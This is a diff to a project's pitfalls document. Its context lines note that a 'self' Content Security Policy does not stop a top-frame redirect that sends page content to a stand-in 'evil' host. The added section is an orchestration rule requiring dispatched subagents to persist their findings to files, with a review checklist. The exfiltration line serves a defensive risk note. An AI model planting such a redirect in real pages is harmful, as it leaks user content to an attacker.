@@ -121,3 +121,25 @@ responses are byte-stable.
 The `'self'` CSP blocks background beaconing, NOT `window.location = 'https://evil/#'+body`.
 Accepted for trusted admin authoring, but §15 Q2 promotes sandboxed-iframe rendering to a
 recommended reconsideration — direct top-frame render is a conscious owner decision.
+
+---
+
+## Orchestration
+
+This section is the discovery hook for plan writers who arrive here via the `writing-plans-enhanced` (or equivalent) mandated-read path. The canonical rules live in `docs/git-strategy.md` → §Multi-agent coordination → Output persistence. This section does NOT restate those rules — it exists to make sure plan writers notice they apply.
+
+### ORCH-1: Analysis Dispatches Must Persist Findings Before Returning
+
+**Trigger:** Your plan dispatches parallel subagents (bug hunts, audits, phased analysis, parallel investigations) whose findings would be expensive to regenerate if lost.
+
+**What you need to do:** Every such dispatched subagent MUST write its complete report to a persistent file BEFORE returning; the response message is not the sole record.
+
+**Read the full rule:** `docs/git-strategy.md` → §Multi-agent coordination → Output persistence. That section carries the copy-pasteable prompt block (with `<PERSISTENCE_PATH>` substitution), file-path conventions, orchestrator commit cadence, and the cases where the rule doesn't apply.
+
+**Why this is in implementation-pitfalls:** because the plan-writing skill mandates reading this file, and this rule has to be noticed at plan-write time (when the dispatch prompts are being drafted), not at execution time (when it's too late). The failure mode — orchestrator context compacting mid-consolidation and lossily dropping findings — is predictable and preventable if the plan author builds persistence into the dispatch prompts from the start.
+
+### Review Checklist
+
+- [ ] **Dispatch prompts include the mandatory-persistence block** — copy from `docs/git-strategy.md` §Output persistence; substitute `<PERSISTENCE_PATH>` with a durable per-subagent path (ORCH-1)
+- [ ] **Plan specifies exact persistence paths, not "write somewhere useful"** — ambiguous paths default to `/tmp` under pressure, which doesn't survive (ORCH-1)
+- [ ] **Orchestrator commits subagent artifacts wave-by-wave** — committed files land on the campaign branch before consolidation begins (ORCH-1)
